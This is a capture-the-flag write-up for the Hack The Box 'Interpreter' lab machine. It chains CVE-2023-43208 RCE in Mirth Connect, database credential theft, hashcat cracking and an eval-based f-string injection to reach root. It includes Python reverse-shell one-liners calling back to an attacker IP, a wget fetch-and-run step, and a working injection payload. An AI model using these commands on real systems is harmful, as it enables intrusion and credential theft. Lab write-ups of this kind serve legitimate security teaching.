# HTB — Interpreter Writeup
**Difficulty:** Medium  
**OS:** Linux  
**Release Date:** 21 Feb 2026  

---

## Summary

Interpreter is a medium Linux machine featuring a vulnerable instance of NextGen Healthcare's **Mirth Connect** (v4.4.0). The attack chain involves unauthenticated RCE via a known CVE, database credential extraction, password hash cracking, and finally a Python f-string injection vulnerability in a custom Flask notification service running as root.

---

## Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 -Pn -oN nmap_full.txt <TARGET_IP>
```

**Results:**
```
22/tcp   open  ssh      OpenSSH 9.2p1 Debian
80/tcp   open  http     Jetty (Mirth Connect Administrator)
443/tcp  open  ssl/http Jetty (Mirth Connect Administrator)
6661/tcp open  unknown  (HL7 MLLP listener)
```

Add the target to `/etc/hosts`:
```
<TARGET_IP>   interpreter.htb
```

Confirm the Mirth Connect version via the API:
```bash
curl -k https://interpreter.htb/api/server/version
# Returns: 4.4.0
```

---

## Initial Foothold — CVE-2023-43208 (Mirth Connect RCE)

NextGen Healthcare Mirth Connect versions prior to **4.4.1** are vulnerable to **CVE-2023-43208**, an unauthenticated Remote Code Execution vulnerability caused by unsafe Java deserialization in the `/api/users` endpoint.

Download a PoC exploit:
```bash
wget https://raw.githubusercontent.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc/master/CVE-2023-43208.py -O exploit.py
```

Set up a listener and deliver a shell script:
```bash
# Terminal 1 — listener
nc -lvnp <PORT>

# Terminal 2 — HTTP server to serve shell script
echo 'python3 -c '"'"'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'"'"'' > ~/shell.sh
python3 -m http.server 8080

# Terminal 3 — exploit
python3 exploit.py -u https://<TARGET_IP> -c "wget http://<ATTACKER_IP>:8080/shell.sh -O /tmp/shell.sh"
python3 exploit.py -u https://<TARGET_IP> -c "bash /tmp/shell.sh"
```

This gives a shell as the `mirth` user.

**Stabilise the shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Lateral Movement — mirth → sedric

### Step 1: Extract Database Credentials

```bash
cat /usr/local/mirthconnect/conf/mirth.properties | grep -E "database.username|database.password|database.url"
```

This reveals credentials to a local MariaDB instance. Connect and dump the Mirth channel configuration:

```bash
mysql -u <DB_USER> -p'<DB_PASS>' -e "USE mc_bdd_prod; SELECT * FROM CHANNEL\G"
```

The channel XML reveals an internal HTTP endpoint at `http://127.0.0.1:54321/addPatient` that processes XML patient data.

### Step 2: Extract User Password Hash

```bash
mysql -u <DB_USER> -p'<DB_PASS>' -e "USE mc_bdd_prod; SELECT * FROM PERSON_PASSWORD;"
```

This returns a **PBKDF2-HMAC-SHA256** hash for the user `sedric`.

### Step 3: Crack the Hash

The hash format is a base64-encoded 40-byte blob: 8-byte salt + 32-byte digest. Convert for hashcat:

```python
import base64
raw = base64.b64decode('<HASH_HERE>')
salt = raw[:8]
digest = raw[8:]
print(f'sha256:600000:{base64.b64encode(salt).decode()}:{base64.b64encode(digest).decode()}')
```

Crack with hashcat (mode 10900):
```bash
hashcat -m 10900 '<formatted_hash>' /usr/share/wordlists/rockyou.txt
```

Password recovered. SSH in as sedric:
```bash
ssh sedric@<TARGET_IP>
```

### User Flag
```bash
cat ~/user.txt
```

---

## Privilege Escalation — sedric → root

### Analysing the Notification Service

Reading `/usr/local/bin/notif.py` (now readable as sedric) reveals a Flask app running on `127.0.0.1:54321` as **root**. The critical vulnerability is in the `template()` function:

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")   # <-- VULNERABLE
```

The `firstname` field is injected directly into an f-string that is passed to `eval()`. The regex allows `{}` characters, enabling **Python f-string injection**.

### Exploitation

Write a reverse shell script:
```bash
cat > /tmp/r.sh << 'EOF'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
EOF
chmod +x /tmp/r.sh
```

Trigger execution via the vulnerable endpoint using an f-string payload in the `firstname` field:
```python
import urllib.request

payload = '{__import__("os").system("/tmp/r.sh")}'
xml = f'<patient><firstname>{payload}</firstname><lastname>Doe</lastname><timestamp>2026</timestamp><sender_app>P</sender_app><id>1</id><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=xml.encode(), headers={'Content-Type': 'application/xml'})
urllib.request.urlopen(req)
```

This triggers `eval()` to execute our injected Python expression as **root**, connecting back to our listener.

### Root Flag
```bash
cat /root/root.txt
```

---

## Attack Chain Summary

```
CVE-2023-43208 RCE
        ↓
  shell as mirth
        ↓
  mirth.properties → DB creds
        ↓
  MySQL → PBKDF2 hash (sedric)
        ↓
  hashcat → plaintext password
        ↓
  SSH as sedric + user.txt
        ↓
  notif.py f-string injection (eval)
        ↓
  shell as root + root.txt
```

---

## Key Takeaways

- **CVE-2023-43208**: Always check service versions — even "internal" healthcare software can be an entry point.
- **Credential reuse in config files**: `mirth.properties` stored plaintext DB credentials.
- **Weak password hashing**: PBKDF2 with a common password falls quickly to hashcat.
- **`eval()` is dangerous**: Using `eval()` on any user-influenced string — even indirectly through f-strings — can lead to full RCE. The regex allowlist provided a false sense of security by permitting `{}` characters needed for f-string injection.
